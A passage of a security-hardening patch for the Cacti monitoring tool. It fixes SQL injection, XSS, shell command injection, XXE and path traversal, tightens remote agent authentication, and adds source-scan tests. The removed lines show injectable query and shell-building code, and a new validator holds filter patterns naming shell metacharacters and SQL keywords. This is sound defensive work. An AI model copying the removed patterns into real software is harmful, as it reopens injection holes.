+-			AVAIL_SNMP_AND_PING => $snmp_result && $ping_result,
++			AVAIL_SNMP_OR_PING                                      => $snmp_result || $ping_result,
++			AVAIL_SNMP_AND_PING                                     => $snmp_result && $ping_result,
+ 			AVAIL_SNMP, AVAIL_SNMP_GET_NEXT, AVAIL_SNMP_GET_SYSDESC => $snmp_result,
+-			AVAIL_PING          => $ping_result,
+-			default             => false,
++			AVAIL_PING                                              => $ping_result,
++			default                                                 => false,
+ 		};
+ 	} // end_ping
+ 
+diff --git a/lib/reports.php b/lib/reports.php
+index 785ca5e59b..43b0e0d5c6 100644
+--- a/lib/reports.php
++++ b/lib/reports.php
+@@ -713,7 +713,7 @@ function reports_tree_has_graphs(int $tree_id,int  $branch_id,int  $effective_us
+ 	$new_graphs = [];
+ 
+ 	if ($search_key != '') {
+-		$sql_swhere = " AND gtg.title_cache REGEXP '" . $search_key . "'";
++		$sql_swhere = ' AND gtg.title_cache REGEXP ' . db_qstr($search_key);
+ 	}
+ 
+ 	$device_id = db_fetch_cell_prepared('SELECT host_id
+@@ -1233,7 +1233,7 @@ function reports_expand_device(array &$report, array $item, int $device_id, int
+ 	if (cacti_sizeof($graph_templates)) {
+ 		foreach ($graph_templates as $id => $name) {
+ 			if ($item['graph_name_regexp'] != '') {
+-				$sql_where .= " AND title_cache REGEXP '" . $item['graph_name_regexp'] . "'";
++				$sql_where .= ' AND title_cache REGEXP ' . db_qstr($item['graph_name_regexp']);
+ 			}
+ 
+ 			$graphs = db_fetch_assoc_prepared("SELECT
+@@ -1272,7 +1272,7 @@ function reports_expand_device(array &$report, array $item, int $device_id, int
+ 					$outstr .= "\t\t\t<td class='text' style='text-align:" . $alignment[$item['align']] . ';font-size: ' . $item['font_size'] . "pt;'>" . PHP_EOL;
+ 				}
+ 
+-				$outstr .= "\t\t\t\t<h3>$title</h3>" . PHP_EOL;
++				$outstr .= "\t\t\t\t<h3>" . htmle($title) . '</h3>' . PHP_EOL;
+ 				$outstr .= "\t\t\t</td>" . PHP_EOL;
+ 				$outstr .= "\t\t</tr>" . PHP_EOL;
+ 			}
+@@ -1424,7 +1424,7 @@ function reports_expand_tree(array &$report, array $item, int $parent, int $outp
+ 			}
+ 
+ 			if ($item['graph_name_regexp'] != '') {
+-				$sql_where .= " AND title_cache REGEXP '" . $item['graph_name_regexp'] . "'";
++				$sql_where .= ' AND title_cache REGEXP ' . db_qstr($item['graph_name_regexp']);
+ 			}
+ 
+ 			if ($leaf_type == 'header' && $nested) {
+@@ -1459,7 +1459,7 @@ function reports_expand_tree(array &$report, array $item, int $parent, int $outp
+ 						} else {
+ 							$outstr .= "\t\t\t<td class='text' style='text-align:" . $alignment[$item['align']] . ';font-size: ' . $item['font_size'] . "pt;'>" . PHP_EOL;
+ 						}
+-						$outstr .= "\t\t\t\t<h3>$title</h3>" . PHP_EOL;
++						$outstr .= "\t\t\t\t<h3>" . htmle($title) . '</h3>' . PHP_EOL;
+ 						$outstr .= "\t\t\t</td>" . PHP_EOL;
+ 						$outstr .= "\t\t</tr>" . PHP_EOL;
+ 					}
+@@ -1470,7 +1470,7 @@ function reports_expand_tree(array &$report, array $item, int $parent, int $outp
+ 				$gr_where = '';
+ 
+ 				if ($item['graph_name_regexp'] != '') {
+-					$gr_where .= " AND title_cache REGEXP '" . $item['graph_name_regexp'] . "'";
++					$gr_where .= ' AND title_cache REGEXP ' . db_qstr($item['graph_name_regexp']);
+ 				}
+ 
+ 				$graph = db_fetch_row('SELECT local_graph_id, title_cache
+@@ -1486,7 +1486,7 @@ function reports_expand_tree(array &$report, array $item, int $parent, int $outp
+ 				$gr_where = '';
+ 
+ 				if ($item['graph_name_regexp'] != '') {
+-					$gr_where .= " AND title_cache REGEXP '" . $item['graph_name_regexp'] . "'";
++					$gr_where .= ' AND title_cache REGEXP ' . db_qstr($item['graph_name_regexp']);
+ 				}
+ 
+ 				$graph = db_fetch_cell('SELECT count(*)
+@@ -1503,7 +1503,7 @@ function reports_expand_tree(array &$report, array $item, int $parent, int $outp
+ 						} else {
+ 							$outstr .= "\t\t\t<td class='text' style='text-align:" . $alignment[$item['align']] . ';font-size: ' . $item['font_size'] . "pt;'>" . PHP_EOL;
+ 						}
+-						$outstr .= "\t\t\t\t<h3>$title</h3>" . PHP_EOL;
++						$outstr .= "\t\t\t\t<h3>" . htmle($title) . '</h3>' . PHP_EOL;
+ 						$outstr .= "\t\t\t</td>" . PHP_EOL;
+ 						$outstr .= "\t\t</tr>" . PHP_EOL;
+ 					}
+@@ -1585,7 +1585,7 @@ function reports_expand_tree(array &$report, array $item, int $parent, int $outp
+ 										$outstr .= "\t\t\t<td class='text' style='text-align:" . $alignment[$item['align']] . ';font-size: ' . $item['font_size'] . "pt;'>" . PHP_EOL;
+ 									}
+ 
+-									$outstr .= "\t\t\t\t<h3>$title</h3>" . PHP_EOL;
++									$outstr .= "\t\t\t\t<h3>" . htmle($title) . '</h3>' . PHP_EOL;
+ 									$outstr .= "\t\t\t</td>" . PHP_EOL;
+ 									$outstr .= "\t\t</tr>" . PHP_EOL;
+ 								}
+@@ -1652,7 +1652,7 @@ function reports_expand_tree(array &$report, array $item, int $parent, int $outp
+ 											} else {
+ 												$outstr .= "\t\t\t<td class='text' style='text-align:" . $alignment[$item['align']] . ';font-size: ' . $item['font_size'] . "pt;'>" . PHP_EOL;
+ 											}
+-											$outstr .= "\t\t\t\t<h3>$title</h3>" . PHP_EOL;
++											$outstr .= "\t\t\t\t<h3>" . htmle($title) . '</h3>' . PHP_EOL;
+ 											$outstr .= "\t\t\t</td>" . PHP_EOL;
+ 											$outstr .= "\t\t</tr>" . PHP_EOL;
+ 										}
+@@ -1726,7 +1726,7 @@ function reports_expand_tree(array &$report, array $item, int $parent, int $outp
+ 							} else {
+ 								$outstr .= "\t\t\t<td class='text' style='text-align:" . $alignment[$item['align']] . ';font-size: ' . $item['font_size'] . "pt;'>" . PHP_EOL;
+ 							}
+-							$outstr .= "\t\t\t\t<h3>$title</h3>" . PHP_EOL;
++							$outstr .= "\t\t\t\t<h3>" . htmle($title) . '</h3>' . PHP_EOL;
+ 							$outstr .= "\t\t\t</td>" . PHP_EOL;
+ 							$outstr .= "\t\t</tr>" . PHP_EOL;
+ 						}
+@@ -1747,7 +1747,7 @@ function reports_expand_tree(array &$report, array $item, int $parent, int $outp
+ 				} else {
+ 					$outstr .= "\t\t\t<td class='text' style='text-align:" . $alignment[$item['align']] . ';font-size: ' . $item['font_size'] . "pt;'>" . PHP_EOL;
+ 				}
+-				$outstr .= "\t\t\t\t<h3>$title</h3>" . PHP_EOL;
++				$outstr .= "\t\t\t\t<h3>" . htmle($title) . '</h3>' . PHP_EOL;
+ 				$outstr .= "\t\t\t</td>" . PHP_EOL;
+ 				$outstr .= "\t\t</tr>" . PHP_EOL;
+ 			}
+diff --git a/lib/rrd.php b/lib/rrd.php
+index 998279dbda..b9e1770fa7 100644
+--- a/lib/rrd.php
++++ b/lib/rrd.php
+@@ -31,9 +31,14 @@
+ }
+ 
+ function escape_command(string $command) : string {
+-	return $command;		// we escape every single argument now, no need for 'special' escaping
+-	// return preg_replace("/(\\\$|`)/", "", $command); # current cacti code
+-	// TODO return preg_replace((\\\$(?=\w+|\*|\@|\#|\?|\-|\\\$|\!|\_|[0-9]|\(.*\))|`(?=.*(?=`)))","$2", $command);  #suggested by ldevantier to allow for a single $
++	// Strip shell command substitution patterns that could allow injection
++	// when the command is passed to shell_exec. Backticks enable command
++	// substitution; $() enables subshell execution. Standalone $ in text
++	// (e.g., "$5.00" in graph legends) is preserved.
++	$command = str_replace('`', '', $command);
++	$command = preg_replace('/\$\(/', '(', $command);
++
++	return $command;
+ }
+ 
+ /**
+@@ -320,7 +325,8 @@ function __rrd_execute(string|array $command_line, bool $log_to_stdout, int $out
+ 	static $last_command;
+ 
+ 	if (is_array($command_line)) {
+-		$command_line = implode(' ', array_map('cacti_escapeshellarg', $command_line));
++		$cmd          = array_shift($command_line);
++		$command_line = $cmd . ' ' . implode(' ', array_map('cacti_escapeshellarg', $command_line));
+ 	}
+ 
+ 	/**
+diff --git a/lib/security_validation.php b/lib/security_validation.php
+new file mode 100644
+index 0000000000..217a4da43f
+--- /dev/null
++++ b/lib/security_validation.php
+@@ -0,0 +1,94 @@
++<?php
++/*
++ +-------------------------------------------------------------------------+
++ | Copyright (C) 2004-2026 The Cacti Group                                 |
++ |                                                                         |
++ | This program is free software; you can redistribute it and/or           |
++ | modify it under the terms of the GNU General Public License             |
++ | as published by the Free Software Foundation; either version 2          |
++ | of the License, or (at your option) any later version.                  |
++ +-------------------------------------------------------------------------+
++ | Cacti: The Complete RRDtool-based Graphing Solution                     |
++ +-------------------------------------------------------------------------+
++*/
++
++/**
++ * Check whether a data input command string is safe to store.
++ * Allows shell pipes and Windows-style path separators for common
++ * command usage, but blocks command separators and substitution patterns.
++ */
++function cacti_input_string_is_safe(string $input_string): bool {
++	$input_string_bare = preg_replace('/<[a-zA-Z_]+>/', '', $input_string);
++
++	return !preg_match('/[;&`$\n\r]/', $input_string_bare);
++}
++
++/**
++ * Validate sort column identifier for query ORDER BY usage.
++ * Allows dotted columns (h.hostname), backtick-quoted identifiers,
++ * aggregate functions (COUNT(*), FIELD(status,1,3,2)), and spaces
++ * inside function calls. Blocks semicolons, comments, and UNION.
++ */
++function cacti_validate_sort_column(string $value, string $default = ''): string {
++	if (preg_match('/;|--|\/\*|\bUNION\b|\bDROP\b|\bDELETE\b|\bINSERT\b|\bUPDATE\b/i', $value)) {
++		return $default;
++	}
++
++	return preg_match('/^[a-zA-Z_`][a-zA-Z0-9_`()., *]*$/', $value) ? $value : $default;
++}
++
++/**
++ * Validate sort direction to strict ASC/DESC.
++ */
++function cacti_validate_sort_direction(string $value, string $default = 'ASC'): string {
++	$value = strtoupper(trim($value));
++
++	return in_array($value, ['ASC', 'DESC'], true) ? $value : $default;
++}
++
++/**
++ * Normalize an arbitrary id list to strictly positive integers.
++ *
++ * @return array<int>
++ */
++function cacti_extract_positive_int_ids(array $items): array {
++	return array_values(array_filter(array_map('intval', $items), function ($v) {
++		return $v > 0;
++	}));
++}
++
++/**
++ * Verify that forward DNS for $client_name contains $client_addr.
++ *
++ * @param callable $dns_lookup function(string $host): mixed
++ */
++function cacti_remote_agent_forward_matches(string $client_addr, string $client_name, callable $dns_lookup): bool {
++	$forward_records = $dns_lookup($client_name);
++
++	if (!is_array($forward_records)) {
++		return false;
++	}
++
++	foreach ($forward_records as $record) {
++		$ip = isset($record['ip']) ? $record['ip'] : (isset($record['ipv6']) ? $record['ipv6'] : '');
++
++		if ($ip === $client_addr) {
++			return true;
++		}
++	}
++
++	return false;
++}
++
++/**
++ * Check if the remote agent host/address is authorized by poller list/whitelist.
++ */
++function cacti_remote_agent_is_authorized_host(string $client_name, string $client_addr, array $pollers, array $whitelist): bool {
++	foreach ($pollers as $poller) {
++		if (isset($poller['hostname']) && (strcasecmp($poller['hostname'], $client_name) === 0 || $poller['hostname'] === $client_addr)) {
++			return true;
++		}
++	}
++
++	return in_array($client_addr, $whitelist, true);
++}
+diff --git a/lib/xml.php b/lib/xml.php
+index cb5d3c566b..a668b9847a 100644
+--- a/lib/xml.php
++++ b/lib/xml.php
+@@ -35,6 +35,10 @@ function xml2array(string $data) : mixed {
+ 	 * original ripped from  on the php-manual:gdemartini@bol.com.br
+ 	 * to be used for data retrieval(result-structure is Data oriented)
+ 	 */
++	if (function_exists('libxml_disable_entity_loader')) {
++		$loader = libxml_disable_entity_loader(true);
++	}
++
+ 	$p     = xml_parser_create();
+ 	$vals  = [];
+ 	$index = [];
+@@ -43,6 +47,10 @@ function xml2array(string $data) : mixed {
+ 	xml_parser_set_option($p, XML_OPTION_CASE_FOLDING, 0);
+ 	xml_parse_into_struct($p, $data, $vals, $index);
+ 
++	if (isset($loader)) {
++		libxml_disable_entity_loader($loader);
++	}
++
+ 	if (version_compare(PHP_VERSION, '8.0', '<')) {
+ 		xml_parser_free($p);
+ 	}
+@@ -130,6 +138,10 @@ function rrdxport2array(string $data) : array {
+ 	/* mvo voncken@mailandnews.com
+ 	original ripped from  on the php-manual:gdemartini@bol.com.br
+ 	to be used for data retrieval(result-structure is Data oriented) */
++	if (function_exists('libxml_disable_entity_loader')) {
++		$loader = libxml_disable_entity_loader(true);
++	}
++
+ 	$p     = xml_parser_create('UTF-8');
+ 	$vals  = [];
+ 	$index = [];
+@@ -138,6 +150,10 @@ function rrdxport2array(string $data) : array {
+ 	xml_parser_set_option($p, XML_OPTION_TARGET_ENCODING, 'UTF-8');
+ 	xml_parse_into_struct($p, $data, $vals, $index);
+ 
++	if (isset($loader)) {
++		libxml_disable_entity_loader($loader);
++	}
++
+ 	if (version_compare(PHP_VERSION, '8.0', '<')) {
+ 		xml_parser_free($p);
+ 	}
+diff --git a/managers.php b/managers.php
+index a1e595a2d9..525fdbdb55 100644
+--- a/managers.php
++++ b/managers.php
+@@ -753,17 +753,26 @@ function form_actions() : void {
+ 
+ 	if (isrv('selected_items')) {
+ 		if (isrv('action_receivers')) {
+-			$selected_items = cacti_unserialize(stripslashes(gnrv('selected_graphs_array')));
++			$selected_items = sanitize_unserialize_selected_items(gnrv('selected_graphs_array'));
+ 
+ 			if ($selected_items != false) {
++				$ids = cacti_extract_positive_int_ids($selected_items);
++
++				if (empty($ids)) {
++					header('Location: managers.php');
++					exit;
++				}
++
++				$ids = implode(',', $ids);
++
+ 				if (gnrv('drp_action') == '1') { // delete
+-					db_execute('DELETE FROM snmpagent_managers WHERE id IN (' . implode(',' ,$selected_items) . ')');
+-					db_execute('DELETE FROM snmpagent_managers_notifications WHERE manager_id IN (' . implode(',' ,$selected_items) . ')');
+-					db_execute('DELETE FROM snmpagent_notifications_log WHERE manager_id IN (' . implode(',' ,$selected_items) . ')');
++					db_execute('DELETE FROM snmpagent_managers WHERE id IN (' . $ids . ')');
++					db_execute('DELETE FROM snmpagent_managers_notifications WHERE manager_id IN (' . $ids . ')');
++					db_execute('DELETE FROM snmpagent_notifications_log WHERE manager_id IN (' . $ids . ')');
+ 				} elseif (gnrv('drp_action') == '2') { // disable
+-					db_execute("UPDATE snmpagent_managers SET disabled = 'on' WHERE id IN (" . implode(',' ,$selected_items) . ')');
++					db_execute("UPDATE snmpagent_managers SET disabled = 'on' WHERE id IN (" . $ids . ')');
+ 				} elseif (gnrv('drp_action') == '3') { // enable
+-					db_execute("UPDATE snmpagent_managers SET disabled = '' WHERE id IN (" . implode(',' ,$selected_items) . ')');
++					db_execute("UPDATE snmpagent_managers SET disabled = '' WHERE id IN (" . $ids . ')');
+ 				}
+ 
+ 				header('Location: managers.php');
+diff --git a/package_import.php b/package_import.php
+index 529bc443a0..705e81d350 100644
+--- a/package_import.php
++++ b/package_import.php
+@@ -659,6 +659,14 @@ function package_diff_file() : void {
+ 	$package_file     = grv('package_file');
+ 	$filename         = grv('filename');
+ 
++	$validated_path = validate_relative_path_within($filename, CACTI_PATH_BASE);
++
++	if ($validated_path === false) {
++		raise_message('validation_error', __('Invalid file path'), MESSAGE_LEVEL_ERROR);
++
++		return;
++	}
++
+ 	$options = [
+ 		'ignoreWhitespace' => true,
+ 		'ignoreCase'       => false
+@@ -671,7 +679,7 @@ function package_diff_file() : void {
+ 		$newfile = explode("\n", $newfile);
+ 	}
+ 
+-	$oldfile = file_get_contents(CACTI_PATH_BASE . '/' . $filename);
++	$oldfile = file_get_contents($validated_path);
+ 
+ 	if ($oldfile !== false) {
+ 		$oldfile = str_replace("\n\r", "\n", $oldfile);
+diff --git a/phpstan-baseline.neon b/phpstan-baseline.neon
+index f90ce8d68c..ddbadc6670 100644
+--- a/phpstan-baseline.neon
++++ b/phpstan-baseline.neon
+@@ -1,35 +1,5 @@
+ parameters:
+ 	ignoreErrors:
+-		-
+-			message: '#^Variable \$argc might not be defined\.$#'
+-			identifier: variable.undefined
+-			count: 1
+-			path: install/cli_check.php
+-
+-		-
+-			message: '#^Variable \$argv might not be defined\.$#'
+-			identifier: variable.undefined
+-			count: 1
+-			path: install/cli_check.php
+-
+-		-
+-			message: '#^Variable \$argv might not be defined\.$#'
+-			identifier: variable.undefined
+-			count: 1
+-			path: install/cli_test.php
+-
+-		-
+-			message: '#^Parameter \#2 \$filter of function filter_var expects int, string given\.$#'
+-			identifier: argument.type
+-			count: 1
+-			path: lib/functions.php
+-
+-		-
+-			message: '#^Cannot use \+\+ on string\.$#'
+-			identifier: postInc.type
+-			count: 1
+-			path: rrdcleaner.php
+-
+ 		-
+ 			message: '#^Variable \$calculated_index in isset\(\) always exists and is not nullable\.$#'
+ 			identifier: isset.variable
+@@ -37,7 +7,13 @@ parameters:
+ 			path: cli/rrdresize.php
+ 
+ 		-
+-			message: '#^Offset 1 on array\{non\-falsy\-string, string\} in isset\(\) always exists and is not nullable\.$#'
+-			identifier: isset.offset
++			message: '#^Parameter \#6 \$gc of function session_set_save_handler expects callable\(int\)\: bool, ''cacti_db_session…'' given\.$#'
++			identifier: argument.type
+ 			count: 1
+-			path: lib/functions.php
++			path: include/session.php
++
++		-
++			message: '#^Variable \$dep_hash_cache might not be defined\.$#'
++			identifier: variable.undefined
++			count: 41
++			path: lib/import.php
+diff --git a/remote_agent.php b/remote_agent.php
+index 9365c05a0a..dfd7df270a 100644
+--- a/remote_agent.php
++++ b/remote_agent.php
+@@ -130,9 +130,9 @@ function remote_agent_strip_domain(string $host) : string {
+ 		$parts = explode('.', $host);
+ 
+ 		return $parts[0];
+-	} else {
+-		return $host;
+ 	}
++
++	return $host;
+ }
+ 
+ function remote_client_authorized() : bool {
+@@ -155,25 +155,12 @@ function remote_client_authorized() : bool {
+ 
+ 	if ($client_name == $client_addr) {
+ 		cacti_log('NOTE: Unable to resolve hostname from address ' . $client_addr, false, 'WEBUI', POLLER_VERBOSITY_MEDIUM);
+-	} else {
+-		$client_name = remote_agent_strip_domain($client_name);
+ 	}
+ 
+ 	if ($client_name != $client_addr) {
+-		$forward_records = @dns_get_record($client_name, DNS_A | DNS_AAAA);
+-		$forward_match   = false;
+-
+-		if (is_array($forward_records)) {
+-			foreach ($forward_records as $record) {
+-				$ip = isset($record['ip']) ? $record['ip'] : (isset($record['ipv6']) ? $record['ipv6'] : '');
+-
+-				if ($ip === $client_addr) {
+-					$forward_match = true;
+-
+-					break;
+-				}
+-			}
+-		}
++		$forward_match = cacti_remote_agent_forward_matches($client_addr, $client_name, function (string $host) {
++			return @dns_get_record($host, DNS_A | DNS_AAAA);
++		});
+ 
+ 		if (!$forward_match) {
+ 			$safe_name = preg_replace('/[^a-zA-Z0-9.\-:]/', '', $client_name);
+@@ -186,22 +173,28 @@ function remote_client_authorized() : bool {
+ 	$pollers = db_fetch_assoc('SELECT * FROM poller WHERE disabled = ""', true, $poller_db_cnn_id);
+ 
+ 	if (cacti_sizeof($pollers) > 1) {
++		if (cacti_remote_agent_is_authorized_host($client_name, $client_addr, $pollers, $remote_agent_whitelist)) {
++			return true;
++		}
++	}
++
++	// Check if a short-hostname match would have succeeded (migration aid)
++	if ($client_name != $client_addr && str_contains($client_name, '.')) {
++		$short_name = explode('.', $client_name)[0];
++
+ 		foreach ($pollers as $poller) {
+-			if (remote_agent_strip_domain($poller['hostname']) == $client_name) {
+-				return true;
+-			}
++			$poller_short = str_contains($poller['hostname'], '.') ? explode('.', $poller['hostname'])[0] : $poller['hostname'];
+ 
+-			if ($poller['hostname'] == $client_addr) {
+-				return true;
+-			}
++			if ($poller_short == $short_name) {
++				$poller_id = isset($poller['id']) ? (int) $poller['id'] : 0;
++				cacti_log("SECURITY: Remote agent '$client_name' ($client_addr) matches poller '{$poller['hostname']}' (id:$poller_id) by short hostname but not FQDN. Update the poller hostname to the FQDN.", false, 'AUTH');
+ 
+-			if (in_array($client_addr,$remote_agent_whitelist, true)) {
+-				return true;
++				break;
+ 			}
+ 		}
+ 	}
+ 
+-	cacti_log("Unauthorized remote agent access attempt from $client_name ($client_addr)");
++	cacti_log(sprintf('WARNING: Unauthorized remote agent access attempt from %s (%s)', $client_name, $client_addr), false, 'AUTH');
+ 
+ 	return false;
+ }
+@@ -215,8 +208,6 @@ function get_graph_data() : bool {
+ 	gfrv('rra_id');
+ 	gfrv('graph_theme', FILTER_CALLBACK, ['options' => 'sanitize_search_string']);
+ 	gfrv('graph_nolegend', FILTER_CALLBACK, ['options' => 'sanitize_search_string']);
+-	gfrv('effective_user');
+-
+ 	$local_graph_id   = gfrv('local_graph_id');
+ 	$rra_id           = gfrv('rra_id');
+ 
+@@ -262,12 +253,8 @@ function get_graph_data() : bool {
+ 		$graph_data_array['graph_theme'] = grv('graph_theme');
+ 	}
+ 
+-	// set the effective user
+-	if (isrv('effective_user')) {
+-		$user = grv('effective_user');
+-	} else {
+-		$user = 0;
+-	}
++	// The remote agent runs as the authenticated session user, not a request override.
++	$user = $_SESSION[SESS_USER_ID] ?? 0;
+ 
+ 	$graph_data_array['graphv'] = true;
+ 
+diff --git a/tests/README.md b/tests/README.md
+new file mode 100644
+index 0000000000..49c49ca523
+--- /dev/null
++++ b/tests/README.md
+@@ -0,0 +1,30 @@
++# Tests
++
++## Docker Security Slice
++
++Run the same security-focused Docker test slice used by CI:
++
++```bash
++cat > .env.test <<'EOF'
++WEB_PORT=18080
++DB_ROOT_PASSWORD=testroot
++DB_NAME=cacti
++DB_USER=cacti
++DB_PASSWORD=testpass
++DB_PORT=13306
++TIMEZONE=UTC
++PHP_MEMORY_LIMIT=256M
++DB_MAX_CONNECTIONS=50
++DB_BUFFER_POOL_SIZE=256M
++EOF
++
++docker compose --env-file .env.test build
++docker compose --env-file .env.test up -d
++docker compose --env-file .env.test exec -T web include/vendor/bin/pest --colors=never \
++  tests/Unit/Pr7036ReviewCoverageTest.php \
++  tests/Unit/PathValidationIntegrationTest.php \
++  tests/Unit/SecurityValidationHelpersTest.php \
++  tests/Unit/RemoteAgentAuthTest.php
++docker compose --env-file .env.test down -v --remove-orphans
++rm -f .env.test
++```
+diff --git a/tests/Unit/AuthImportSecurityPatternsTest.php b/tests/Unit/AuthImportSecurityPatternsTest.php
+new file mode 100644
+index 0000000000..45e7a74705
+--- /dev/null
++++ b/tests/Unit/AuthImportSecurityPatternsTest.php
+@@ -0,0 +1,456 @@
++<?php
++/*
++ +-------------------------------------------------------------------------+
++ | Copyright (C) 2004-2026 The Cacti Group                                 |
++ |                                                                         |
++ | This program is free software; you can redistribute it and/or           |
++ | modify it under the terms of the GNU General Public License             |
++ | as published by the Free Software Foundation; either version 2          |
++ | of the License, or (at your option) any later version.                  |
++ +-------------------------------------------------------------------------+
++ | Cacti: The Complete RRDtool-based Graphing Solution                     |
++ +-------------------------------------------------------------------------+
++*/
++
++/*
++ * Source-scan tests for auth and import security patterns.
++ *
++ * These tests verify that security-relevant patterns exist in lib/auth.php,
++ * lib/import.php, and lib/package.php by scanning the source text. They do
++ * not execute the functions (which require a DB), but confirm that guards,
++ * allowlists, and validation logic remain in place across refactors.
++ */
++
++$authSource    = file_get_contents(__DIR__ . '/../../lib/auth.php');
++$importSource  = file_get_contents(__DIR__ . '/../../lib/import.php');
++$packageSource = file_get_contents(__DIR__ . '/../../lib/package.php');
++$xmlSource     = file_get_contents(__DIR__ . '/../../lib/xml.php');
++
++// =====================================================================
++// lib/auth.php -- session validation functions exist
++// =====================================================================
++
++test('auth.php defines is_realm_allowed function', function () use ($authSource) {
++	expect($authSource)->toContain('function is_realm_allowed(');
++});
++
++test('auth.php defines is_view_allowed function', function () use ($authSource) {
++	expect($authSource)->toContain('function is_view_allowed(');
++});
++
++test('auth.php defines is_graph_allowed function', function () use ($authSource) {
++	expect($authSource)->toContain('function is_graph_allowed(');
++});
++
++test('auth.php defines is_tree_allowed function', function () use ($authSource) {
++	expect($authSource)->toContain('function is_tree_allowed(');
++});
++
++test('auth.php defines is_device_allowed function', function () use ($authSource) {
++	expect($authSource)->toContain('function is_device_allowed(');
++});
++
++test('auth.php defines auth_valid_user function', function () use ($authSource) {
++	expect($authSource)->toContain('function auth_valid_user(');
++});
++
++test('auth.php defines is_user_perms_valid function', function () use ($authSource) {
++	expect($authSource)->toContain('function is_user_perms_valid(');
++});
++
++// =====================================================================
++// lib/auth.php -- is_view_allowed column allowlist
++// =====================================================================
++
++test('is_view_allowed uses an allowed_views array', function () use ($authSource) {
++	expect($authSource)->toContain('$allowed_views');
++});
++
++test('is_view_allowed checks view against allowed_views with in_array', function () use ($authSource) {
++	expect($authSource)->toContain("in_array(\$view, \$allowed_views, true)");
++});
++
++test('is_view_allowed allowlist contains show_tree', function () use ($authSource) {
++	expect($authSource)->toContain("'show_tree'");
++});
++
++test('is_view_allowed allowlist contains show_list', function () use ($authSource) {
++	expect($authSource)->toContain("'show_list'");
++});
++
++test('is_view_allowed allowlist contains show_preview', function () use ($authSource) {
++	expect($authSource)->toContain("'show_preview'");
++});
++
++test('is_view_allowed allowlist contains graph_settings', function () use ($authSource) {
++	expect($authSource)->toContain("'graph_settings'");
++});
++
++// =====================================================================
++// lib/auth.php -- session constants used instead of raw strings
++// =====================================================================
++
++test('auth.php uses SESS_USER_ID constant for session access', function () use ($authSource) {
++	expect($authSource)->toContain('$_SESSION[SESS_USER_ID]');
++});
++
++test('auth.php uses SESS_USER_REALMS constant for realm caching', function () use ($authSource) {
++	expect($authSource)->toContain('$_SESSION[SESS_USER_REALMS]');
++});
++
++test('auth.php uses SESS_AUTH_NAMES constant', function () use ($authSource) {
++	expect($authSource)->toContain('$_SESSION[SESS_AUTH_NAMES]');
++});
++
++test('auth.php uses kill_session_var for session cleanup', function () use ($authSource) {
++	expect($authSource)->toContain('kill_session_var(SESS_USER_ID)');
++});
++
++// =====================================================================
++// lib/auth.php -- prepared statements for all DB queries
++// =====================================================================
++
++test('auth.php uses db_fetch_cell_prepared for user lookups', function () use ($authSource) {
++	expect($authSource)->toContain('db_fetch_cell_prepared(');
++});
++
++test('auth.php uses db_execute_prepared for user mutations', function () use ($authSource) {
++	expect($authSource)->toContain('db_execute_prepared(');
++});
++
++test('auth.php uses db_fetch_row_prepared for row fetches', function () use ($authSource) {
++	expect($authSource)->toContain('db_fetch_row_prepared(');
++});
++
++// =====================================================================
++// lib/auth.php -- cookie token uses cryptographic randomness
++// =====================================================================
++
++test('set_auth_cookie uses random_bytes for token generation', function () use ($authSource) {
++	expect($authSource)->toContain('random_bytes(');
++});
++
++test('auth cookie tokens are hashed with sha512', function () use ($authSource) {
++	expect($authSource)->toContain("hash('sha512'");
++});
++
++// =====================================================================
++// lib/auth.php -- password security functions
++// =====================================================================
++
++test('auth.php defines secpass_check_pass for password validation', function () use ($authSource) {
++	expect($authSource)->toContain('function secpass_check_pass(');
++});
++
++test('auth.php defines secpass_check_history for password reuse prevention', function () use ($authSource) {
++	expect($authSource)->toContain('function secpass_check_history(');
++});
++
++test('auth.php uses compat_password_verify not raw comparison', function () use ($authSource) {
++	expect($authSource)->toContain('compat_password_verify(');
++});
++
++test('auth.php uses compat_password_hash for hashing', function () use ($authSource) {
++	expect($authSource)->toContain('compat_password_hash(');
++});
++
++// =====================================================================
++// lib/auth.php -- account lockout protection
++// =====================================================================
++
++test('auth.php defines auth_process_lockout function', function () use ($authSource) {
++	expect($authSource)->toContain('function auth_process_lockout(');
++});
++
++test('auth.php defines auth_process_lockout_check function', function () use ($authSource) {
++	expect($authSource)->toContain('function auth_process_lockout_check(');
++});
++
++test('auth.php defines auth_checkclear_lockout function', function () use ($authSource) {
++	expect($authSource)->toContain('function auth_checkclear_lockout(');
++});
++
++// =====================================================================
++// lib/auth.php -- input validation on user management functions
++// =====================================================================
++
++test('user_remove validates user_id with input_validate_input_number', function () use ($authSource) {
++	// user_remove calls input_validate_input_number before any DB ops
++	$start = strpos($authSource, 'function user_remove(');
++	if ($start === false) {
++		$this->fail('function user_remove not found in source');
++	}
++	$fnBody = substr($authSource, $start);
++	$end = strpos($fnBody, "\nfunction ");
++	if ($end === false) {
++		$this->fail('no function follows user_remove in source');
++	}
++	$fnBody = substr($fnBody, 0, $end);
++
++	expect($fnBody)->toContain('input_validate_input_number($user_id');
++});
++
++test('user_disable validates user_id with input_validate_input_number', function () use ($authSource) {
++	$start = strpos($authSource, 'function user_disable(');
++	if ($start === false) {
++		$this->fail('function user_disable not found in source');
++	}
++	$fnBody = substr($authSource, $start);
++	$end = strpos($fnBody, "\nfunction ");
++	if ($end === false) {
++		$this->fail('no function follows user_disable in source');
++	}
++	$fnBody = substr($fnBody, 0, $end);
++
++	expect($fnBody)->toContain('input_validate_input_number($user_id');
++});
++
++test('user_enable validates user_id with input_validate_input_number', function () use ($authSource) {
++	$start = strpos($authSource, 'function user_enable(');
++	if ($start === false) {
++		$this->fail('function user_enable not found in source');
++	}
++	$fnBody = substr($authSource, $start);
++	$end = strpos($fnBody, "\nfunction ");
++	if ($end === false) {
++		$this->fail('no function follows user_enable in source');
++	}
++	$fnBody = substr($fnBody, 0, $end);
++
++	expect($fnBody)->toContain('input_validate_input_number($user_id');
++});
++
++// =====================================================================
++// lib/auth.php -- get_basic_auth_username sanitization
++// =====================================================================
++
++test('auth.php sanitizes basic auth username with sanitize_search_string', function () use ($authSource) {
++	$start = strpos($authSource, 'function auth_get_username(');
++	if ($start === false) {
++		$this->fail('function auth_get_username not found in source');
++	}
++	$fnBody = substr($authSource, $start);
++	$end = strpos($fnBody, "\nfunction ");
++	if ($end === false) {
++		$this->fail('no function follows auth_get_username in source');
++	}
++	$fnBody = substr($fnBody, 0, $end);
++
++	expect($fnBody)->toContain('sanitize_search_string($username)');
++});
++
++test('get_basic_auth_username handles array-typed SERVER vars', function () use ($authSource) {
++	// Protection against header injection via array-typed superglobals
++	expect($authSource)->toContain('is_array($_SERVER[');
++});
++
++// =====================================================================
